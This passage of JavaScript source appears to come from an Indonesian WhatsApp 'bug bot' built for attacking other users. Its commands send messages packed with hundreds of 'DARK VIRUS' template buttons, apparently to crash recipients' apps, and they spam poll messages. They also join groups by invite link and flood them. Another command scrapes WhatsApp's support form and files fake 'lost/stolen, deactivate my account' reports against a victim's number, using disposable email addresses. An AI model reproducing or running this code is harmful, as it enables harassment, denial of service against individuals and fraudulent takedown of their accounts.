{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
,*/
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {
text: 'BUG BY TANZA', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `AKWOWK KASIAN️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
case 'poll': {
if (!itsMediablo) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU TANZA`
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT WAR TANZA",
"options": [
{
"optionName": "KATANYA WA KEBAL"
},
{
"optionName": "BERANI VOTE GA"
},
{
"optionName": "VOTE LAH SEMUA"
},
{
"optionName": "KATANYA KEBAL"
},
{
"optionName": "SALAM BROTHER BY TANZA"
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: doc })
diablo.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
deploy('sukses sendbug')}
}
break
// BUG VERIF //
case 'banned':
case 'kenon':
case 'logout':
case 'verif':
case 'ibrambanned':
case 'tanzzkenon':
case 'tanzzlogout':
case 'tanzzverif':
case 'report':{
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
diablobotwhatsapp.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
break
// INI BUG GRUP //
  case "santetgc":
  case "boykotgc":
  case "buggc":
  case "entodgc":
  case "'tanzzgasgc":
  case "tanzzbuggc":{
   if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
diablobotwhatsapp.reply(`otw bos`)
if (!q) return reply(`Penggunaan ${prefix+command} link`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "5"
for (let i = 0; i < jumlah; i++) {
let kir = await diablo.groupAcceptInvite(result)
diablo.sendMessage(kir, {
text: 'BUG BY TANZA', 
templateButtons: [
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
